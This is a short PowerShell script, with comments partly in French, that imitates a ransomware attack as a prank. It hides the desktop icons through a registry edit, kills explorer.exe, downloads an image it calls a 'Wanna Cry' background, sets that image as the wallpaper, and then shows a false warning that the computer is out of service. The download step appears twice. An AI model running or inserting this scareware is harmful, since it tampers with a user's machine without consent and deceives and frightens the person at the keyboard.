#Hides Desktop Icons
$Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
Get-Process "explorer"| Stop-Process

#Changes Background  
#URL For the Image of your choice (Wanna Cry Ransomware Background)
$url = "https://c4.wallpaperflare.com/wallpaper/553/61/171/5k-black-hd-mockup-wallpaper-preview.jpg"


Invoke-WebRequest $url -OutFile C:\temp\test.jpg


# Téléchargement de l'image (si nécessaire)
$url = "https://c4.wallpaperflare.com/wallpaper/553/61/171/5k-black-hd-mockup-wallpaper-preview.jpg"
Invoke-WebRequest $url -OutFile "C:\temp\test.jpg"

# Définition de la classe C# pour changer le fond d'écran
$setwallpapersrc = @"
using System.Runtime.InteropServices;

public class Wallpaper
{
  public const int SPI_SETDESKWALLPAPER = 20;
  public const int SPIF_UPDATEINIFILE = 0x01;
  public const int SPIF_SENDWININICHANGE = 0x02;

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  static extern int SystemParametersInfo(int uAction, uint uParam, string lpvParam, uint fuWinIni);

  public static void SetWallpaper(string path)
  {
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
  }
}
"@

# Ajout de la classe au script PowerShell
Add-Type -TypeDefinition $setwallpapersrc

# Application du nouveau fond d'écran
[Wallpaper]::SetWallpaper("C:\temp\test.jpg")

#Pop Up Message

function MsgBox {

[CmdletBinding()]
param (	
[Parameter (Mandatory = $True)]
[Alias("m")]
[string]$message,

[Parameter (Mandatory = $False)]
[Alias("t")]
[string]$title,

[Parameter (Mandatory = $False)]
[Alias("b")]
[ValidateSet('OK','OKCancel','YesNoCancel','YesNo')]
[string]$button,

[Parameter (Mandatory = $False)]
[Alias("i")]
[ValidateSet('None','Hand','Question','Warning','Asterisk')]
[string]$image
)

Add-Type -AssemblyName PresentationCore,PresentationFramework

if (!$title) {$title = " "}
if (!$button) {$button = "OK"}
if (!$image) {$image = "None"}

[System.Windows.MessageBox]::Show($message,$title,$button,$image)

}

MsgBox -m 'Votre ordinateur est maintenant hors service' -t "Warning" -b OKCancel -i Warning
